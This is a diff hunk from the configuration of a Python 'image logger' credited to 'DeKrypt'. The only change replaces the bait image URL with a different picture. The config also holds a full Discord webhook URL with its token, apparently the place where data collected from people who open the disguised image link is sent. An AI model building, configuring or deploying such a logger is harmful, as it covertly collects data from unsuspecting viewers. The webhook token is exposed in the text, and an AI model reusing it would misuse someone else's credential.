@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1353969638081298483/fXb1jfYhhCJss7fAeil-Xsl8qLQCQPWeA5KWmxJ8KclTTx2P7NH1ym3lMdcLUTHQ4Jip",
-    "image": "https://tenor.com/view/discord-loading-buffering-waiting-to-load-gif-16464415?quality=lossless", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/a4/c4/1b/a4c41beb542fa3ea39884aa5a8ddfbb0.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
